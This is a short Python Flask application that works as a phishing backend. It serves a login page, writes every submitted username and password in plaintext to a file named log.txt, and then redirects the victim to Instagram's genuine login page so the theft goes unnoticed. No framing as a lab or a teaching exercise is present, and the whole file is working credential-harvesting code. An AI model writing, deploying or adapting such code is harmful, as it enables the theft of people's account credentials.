from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    pw = request.form.get('password')
    with open("log.txt", "a") as f:
        f.write(f"User: {user} | Pass: {pw}\n")
    return redirect("https://www.instagram.com/accounts/login/")

if __name__ == '__main__':
    app.run(port=8080)